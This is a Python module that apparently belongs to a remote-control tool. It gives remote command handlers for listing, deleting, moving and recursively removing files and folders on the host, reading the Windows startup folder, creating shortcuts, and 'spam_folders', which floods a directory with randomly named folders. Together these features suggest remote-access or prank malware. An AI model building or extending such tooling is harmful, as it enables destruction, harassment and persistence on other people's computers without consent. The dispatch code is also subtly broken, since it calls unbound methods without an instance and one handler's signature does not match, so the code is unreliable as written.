import os 
import shutil

from typing import Callable, Dict
from pydantic import ValidationError
from random import randrange
from ..commands import Command, CommandArgs, ICommandModule, CommandResult
from ..constants import STARTUP_PATH


class ListDirArgs(CommandArgs):
    path: str
    user_id: str

class ChDirArgs(ListDirArgs):
    pass

class GetCwdArgs(ListDirArgs):
    pass

class DeleteFileArgs(ListDirArgs):
    pass

class SpamFoldersArgs(ListDirArgs):
    count: int

class DeleteFolderArgs(ListDirArgs):
    pass

class MakeDirectoryArgs(ListDirArgs):
    pass

class MakeShortcutArgs(CommandArgs):
    file: str
    destination: str

class MoveFileArgs(CommandArgs):
    _from: str
    to: str
    user_id: str

class UserSession:
    def __init__(self):
        self.cwd = os.getcwd()

    def set_cwd(self, path: str):
        self.cwd = path

    def get_cwd(self) -> str:
        return self.cwd


class FileSystem(ICommandModule):
    def __init__(self):
        self.sessions: Dict[str, UserSession] = {}

    def get_user_session(self, user_id: str) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession()
        return self.sessions[user_id]

    def listdir(self, args: ListDirArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        try:
            files = os.listdir(session.get_cwd() if not args.path else args.path)
            return CommandResult(success=True, result=files)
        except Exception as e:
            return CommandResult(success=False, result=str(e))
        
    def chdir(self, args: ChDirArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        try:
            os.chdir(args.path)
            session.set_cwd(args.path)
            return CommandResult(success=True, result="Changed directory")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def getcwd(self, args: GetCwdArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        return CommandResult(success=True, result=session.get_cwd())

    def delete_file(self, args: DeleteFileArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        try:
            os.remove(os.path.join(session.get_cwd(), args.path))
            return CommandResult(success=True, result="File deleted")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def spam_folders(self, args: SpamFoldersArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        try:
            base_path = os.path.join(session.get_cwd(), args.path)
            for _ in range(args.count):
                rand = randrange(1, 50000)
                os.makedirs(os.path.join(base_path, f"{rand}"))
            return CommandResult(success=True, result="Folders created")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def delete_folder(self, args: DeleteFolderArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        try:
            shutil.rmtree(os.path.join(session.get_cwd(), args.path))
            return CommandResult(success=True, result="Folder deleted")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def make_directory(self, args: MakeDirectoryArgs, user_id: str) -> CommandResult:
        session = self.get_user_session(user_id)
        try:
            os.mkdir(os.path.join(session.get_cwd(), args.path))
            return CommandResult(success=True, result="Directory created")
        except Exception as e:
            return CommandResult(success=False, result=str(e))
    
    @staticmethod
    def get_start_up_contents() -> CommandResult:
        try:
            files = os.listdir(STARTUP_PATH)  # Ensure STARTUP_PATH is defined
            return CommandResult(success=True, result=files)
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def move_file(self, args: MoveFileArgs) -> CommandResult:
        session = self.get_user_session(args.user_id)
        try:
            os.replace(os.path.join(session.get_cwd(), args._from), os.path.join(session.get_cwd(), args.to))
            return CommandResult(success=True, result="File moved")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    @staticmethod
    def make_shortcut(args: MakeShortcutArgs) -> CommandResult:
        try:
            from swinlnk.swinlnk import SWinLnk
            swl = SWinLnk()
            swl.create_lnk(args.file, args.destination)
            return CommandResult(success=True, result="Shortcut created")
        except Exception as e:
            return CommandResult(success=False, result=str(e))

    def run(self, command: Command, args: CommandArgs) -> CommandResult:
        command_func_map_with_args: Dict[Command, Callable[[CommandArgs], CommandResult]] = {
            Command.LIST_CURRENT_DIRECTORY: FileSystem.listdir,
            Command.CHDIR: FileSystem.chdir,
            Command.DELETE_FILE: FileSystem.delete_file,
            Command.SPAM_FOLDERS: FileSystem.spam_folders,
            Command.DELETE_FOLDER: FileSystem.delete_folder,
            Command.MAKE_DIRECTORY: FileSystem.make_directory,
            Command.MAKE_SHORTCUT: FileSystem.make_shortcut,
            Command.MOVE_FILE: FileSystem.move_file,
            Command.GETCWD: FileSystem.getcwd
        }
        command_func_map_no_args: Dict[Command, Callable[[], CommandResult]] = {
            Command.GET_START_UP_CONTENTS: FileSystem.get_start_up_contents,
        }
        if command not in command_func_map_no_args and command not in command_func_map_with_args:
            return CommandResult(result=f"Error: Command not found in module.", success=False)    
        
        try:
            if command in command_func_map_no_args:
                return command_func_map_no_args[command]()
            else:
                return command_func_map_with_args[command](args)
        except ValidationError as e:
            return CommandResult(success=False, result=f"Validation error: {e}")
        except Exception as e:
            return CommandResult(success=False, result=f"Error: {e}")
